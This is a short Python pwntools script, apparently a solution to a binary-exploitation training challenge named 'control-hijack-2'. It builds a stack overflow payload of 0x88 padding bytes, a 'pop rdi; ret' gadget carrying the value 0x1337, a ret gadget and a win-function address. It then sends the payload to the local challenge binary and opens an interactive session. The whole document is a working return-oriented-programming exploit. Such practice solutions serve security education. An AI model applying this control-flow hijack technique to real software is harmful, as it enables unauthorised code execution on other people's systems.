from pwn import *

#0x00000000004022f3 : pop rdi ; ret
token = 0x1337
win_add = 0x401fce
offset = 0x88
pop_gadjet = 0x4022f3
ret_gadjet = 0x40101a

payload = offset * b'A' + p64(pop_gadjet) + p64(token) + p64(ret_gadjet) + p64(win_add)


r = process('/challenge/binary-exploitation-control-hijack-2')

r.send(payload)
r.interactive()
